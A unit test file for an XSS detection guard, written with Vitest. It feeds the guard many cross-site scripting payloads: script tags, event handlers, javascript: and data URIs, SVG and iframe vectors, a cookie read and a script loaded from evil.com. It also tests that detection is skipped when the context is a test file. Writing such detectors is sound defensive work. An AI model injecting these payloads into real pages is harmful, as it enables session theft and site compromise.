/**
 * XSSGuard Unit Tests
 * ===================
 * Comprehensive unit tests for XSS attack pattern detection.
 */

import { describe, it, expect } from 'vitest';
import { XSSGuard, detectXSS, checkXSS, getXSSReport } from '../../../src/guards/xss-safety.js';

describe('XSSGuard', () => {
  describe('XSS-001: Script Tag Injection', () => {
    it('should detect <script>alert(1)</script>', () => {
      const result = detectXSS('<script>alert(1)</script>');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.length).toBeGreaterThan(0);
    });

    it('should detect script with JavaScript', () => {
      const result = detectXSS('<script>alert(document.cookie)</script>');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.length).toBeGreaterThan(0);
    });

    it('should detect script with src', () => {
      const result = detectXSS('<script src="http://evil.com/xss.js"></script>');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.length).toBeGreaterThan(0);
    });
  });

  describe('XSS-002: Event Handler Detection', () => {
    it('should detect onclick=', () => {
      const result = detectXSS('<div onclick="alert(1)">Click me</div>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect onerror=', () => {
      const result = detectXSS('<img src=x onerror="alert(1)">');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect onload=', () => {
      const result = detectXSS('<body onload="alert(1)">');
      expect(result.hasXSS).toBe(true);
    });
  });

  describe('XSS-003: JavaScript URI Detection', () => {
    it('should detect javascript: protocol', () => {
      const result = detectXSS('<a href="javascript:alert(1)">Click</a>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect javascript:void(0)', () => {
      const result = detectXSS('<a href="javascript:void(0)">Click</a>');
      expect(result.hasXSS).toBe(true);
    });
  });

  describe('OWASP XSS Pattern Coverage', () => {
    it('XSS-004: should detect OWASP A03-201 (basic script injection)', () => {
      const result = detectXSS('<script>alert("XSS")</script>');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.some(p => p.testId === 'A03-201')).toBe(true);
    });

    it('XSS-005: should detect OWASP A03-202 (stored XSS)', () => {
      const result = detectXSS('<img src=x onerror="alert(1)">');
      expect(result.hasXSS).toBe(true);
    });

    it('XSS-006: should detect OWASP A03-203 (DOM-based XSS)', () => {
      const result = detectXSS('document.write("<script>alert(1)</script>")');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.some(p => p.testId === 'A03-203')).toBe(true);
    });

    it('XSS-007: should detect OWASP A03-204 (event handler XSS)', () => {
      const result = detectXSS('<div onmouseover="alert(1)">Hover</div>');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.some(p => p.testId === 'A03-204')).toBe(true);
    });

    it('XSS-008: should detect OWASP A03-205 (polyglot XSS)', () => {
      const result = detectXSS('javascript:alert(1)');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.some(p => p.testId === 'A03-205')).toBe(true);
    });

    it('XSS-009: should detect OWASP A03-206 (CSS expression XSS)', () => {
      // The pattern requires expression() with word characters inside
      const result = detectXSS('<div style="expression(alert)">');
      expect(result.hasXSS).toBe(true);
    });

    it('XSS-010: should detect OWASP A03-207 (SVG XSS)', () => {
      const result = detectXSS('<svg onload=alert(1)>');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.some(p => p.testId === 'A03-207')).toBe(true);
    });

    it('XSS-011: should detect OWASP A03-208 (JavaScript URI XSS)', () => {
      const result = detectXSS('<a href="javascript:alert(1)">');
      expect(result.hasXSS).toBe(true);
      expect(result.patterns.some(p => p.testId === 'A03-208')).toBe(true);
    });
  });

  describe('XSS-012: SVG-based XSS', () => {
    it('should detect SVG XSS', () => {
      const result = detectXSS('<svg onload=alert(1)>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect SVG with script', () => {
      const result = detectXSS('<svg><script>alert(1)</script></svg>');
      expect(result.hasXSS).toBe(true);
    });
  });

  describe('XSS-013: Iframe Injection', () => {
    it('should detect iframe injection', () => {
      const result = detectXSS('<iframe src="javascript:alert(1)"></iframe>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect iframe with srcdoc', () => {
      const result = detectXSS('<iframe srcdoc="<script>alert(1)</script>"></iframe>');
      expect(result.hasXSS).toBe(true);
    });
  });

  describe('XSS-014: Meta Refresh XSS', () => {
    it('should detect meta refresh XSS', () => {
      const result = detectXSS('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">');
      expect(result.hasXSS).toBe(true);
    });
  });

  describe('XSS-015: XSS Report Generation', () => {
    it('should generate XSS report', () => {
      const guard = new XSSGuard();
      const report = guard.getXSSReport('<script>alert(1)</script>');
      expect(report).toBeDefined();
      expect(typeof report).toBe('string');
    });

    it('should include severity in report', () => {
      const guard = new XSSGuard();
      const report = guard.getXSSReport('<script>alert(1)</script>');
      // Severity is lowercase in the report
      expect(report).toContain('critical');
    });

    it('should show passed for safe content', () => {
      const guard = new XSSGuard();
      const report = guard.getXSSReport('<p>Hello world</p>');
      expect(report).toContain('PASSED');
    });
  });

  describe('XSS-016: Safe HTML', () => {
    it('should allow safe HTML content', () => {
      const safeHtml = [
        '<p>Hello world</p>',
        '<div class="container">Content</div>',
        '<a href="https://example.com">Link</a>',
        '<strong>Bold text</strong>'
      ];

      for (const html of safeHtml) {
        const result = detectXSS(html);
        expect(result.hasXSS).toBe(false);
      }
    });

    it('should set risk_score to 0 for safe content', () => {
      const guard = new XSSGuard();
      const result = guard.validate('<p>Hello world</p>');
      expect(result.risk_score).toBe(0);
    });
  });

  describe('Class Interface', () => {
    it('should support class-based instantiation', () => {
      const guard = new XSSGuard();
      expect(guard).toBeDefined();
      expect(guard.validate).toBeInstanceOf(Function);
    });

    it('should support class-based validation', () => {
      const guard = new XSSGuard();
      const result = guard.validate('<script>alert(1)</script>');
      expect(result.blocked).toBe(true);
    });

    it('should support getConfig method', () => {
      const guard = new XSSGuard({ mode: 'permissive' });
      const config = guard.getConfig();
      expect(config.mode).toBe('permissive');
    });
  });

  describe('Findings Structure', () => {
    it('should include category in findings', () => {
      const guard = new XSSGuard();
      const result = guard.validate('<script>alert(1)</script>');
      expect(result.findings?.[0]).toHaveProperty('category');
    });

    it('should include pattern_name in findings', () => {
      const guard = new XSSGuard();
      const result = guard.validate('<script>alert(1)</script>');
      expect(result.findings?.[0]).toHaveProperty('pattern_name');
    });

    it('should include severity in findings', () => {
      const guard = new XSSGuard();
      const result = guard.validate('<script>alert(1)</script>');
      expect(result.findings?.[0]).toHaveProperty('severity');
    });

    it('should include match in findings', () => {
      const guard = new XSSGuard();
      const result = guard.validate('<script>alert(1)</script>');
      expect(result.findings?.[0]).toHaveProperty('match');
    });
  });

  describe('Detection Result Structure', () => {
    it('should return hasXSS flag', () => {
      const result = detectXSS('<script>alert(1)</script>');
      expect(result).toHaveProperty('hasXSS');
      expect(typeof result.hasXSS).toBe('boolean');
    });

    it('should return severity', () => {
      const result = detectXSS('<script>alert(1)</script>');
      expect(result).toHaveProperty('severity');
    });

    it('should return patterns array', () => {
      const result = detectXSS('<script>alert(1)</script>');
      expect(result).toHaveProperty('patterns');
      expect(Array.isArray(result.patterns)).toBe(true);
    });

    it('should return message', () => {
      const result = detectXSS('<script>alert(1)</script>');
      expect(result).toHaveProperty('message');
    });
  });

  describe('Pattern Properties', () => {
    it('should include pattern property', () => {
      const result = detectXSS('<script>alert(1)</script>');
      if (result.patterns.length > 0) {
        expect(result.patterns[0]).toHaveProperty('pattern');
      }
    });

    it('should include category property', () => {
      const result = detectXSS('<script>alert(1)</script>');
      if (result.patterns.length > 0) {
        expect(result.patterns[0]).toHaveProperty('category');
      }
    });

    it('should include testId property', () => {
      const result = detectXSS('<script>alert(1)</script>');
      if (result.patterns.length > 0) {
        expect(result.patterns[0]).toHaveProperty('testId');
      }
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty input', () => {
      const guard = new XSSGuard();
      const result = guard.validate('');
      expect(result.allowed).toBe(true);
    });

    it('should handle whitespace only', () => {
      const guard = new XSSGuard();
      const result = guard.validate('   ');
      expect(result.allowed).toBe(true);
    });

    it('should handle multiple XSS vectors', () => {
      const result = detectXSS('<script>alert(1)</script><img src=x onerror=alert(1)>');
      expect(result.patterns.length).toBeGreaterThanOrEqual(2);
    });

    it('should handle encoded XSS', () => {
      const encoded = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const result = detectXSS(encoded);
      expect(result).toBeDefined();
      // Encoded content might not be detected - that's expected
    });

    it('should handle mixed case tags', () => {
      const result = detectXSS('<SCRIPT>alert(1)</SCRIPT>');
      expect(result.hasXSS).toBe(true);
    });

    it('should handle null input', () => {
      const result = detectXSS(null as unknown as string);
      expect(result.hasXSS).toBe(false);
    });
  });

  describe('Advanced Patterns', () => {
    it('should detect eval-based XSS', () => {
      const result = detectXSS('<script>eval("alert(1)")</script>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect setTimeout-based XSS', () => {
      const result = detectXSS('<script>setTimeout("alert(1)",0)</script>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect data URI XSS', () => {
      const result = detectXSS('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect document.write XSS', () => {
      const result = detectXSS('document.write("<script>alert(1)</script>")');
      expect(result.hasXSS).toBe(true);
    });

    it('should detect location.href XSS', () => {
      const result = detectXSS('location.href = "javascript:alert(1)"');
      expect(result.hasXSS).toBe(true);
    });
  });

  describe('Convenience Functions', () => {
    it('should support checkXSS function', () => {
      const result = checkXSS('<script>alert(1)</script>');
      expect(result.blocked).toBe(true);
    });

    it('should allow safe content via checkXSS', () => {
      const result = checkXSS('<p>Hello world</p>');
      expect(result.allowed).toBe(true);
    });

    it('should support getXSSReport function', () => {
      const report = getXSSReport('<script>alert(1)</script>');
      expect(typeof report).toBe('string');
      expect(report).toContain('XSS');
    });
  });

  describe('Mode Configuration', () => {
    it('should block in strict mode', () => {
      const guard = new XSSGuard({ mode: 'strict' });
      const result = guard.validate('<script>alert(1)</script>');
      expect(result.blocked).toBe(true);
    });

    it('should use context parameter', () => {
      const guard = new XSSGuard({ context: 'test-file.spec.ts' });
      const result = guard.validate('<div onclick="alert(1)">');
      // Test files might bypass some checks
      expect(result).toBeDefined();
    });
  });

  describe('Safe Context Detection', () => {
    it('should bypass test file context', () => {
      const result = detectXSS('<div onclick="alert(1)">', 'test.spec.ts');
      // Should not detect in test context
      expect(result.hasXSS).toBe(false);
    });

    it('should detect in regular context', () => {
      const result = detectXSS('<div onclick="alert(1)">', 'app.ts');
      expect(result.hasXSS).toBe(true);
    });
  });
});
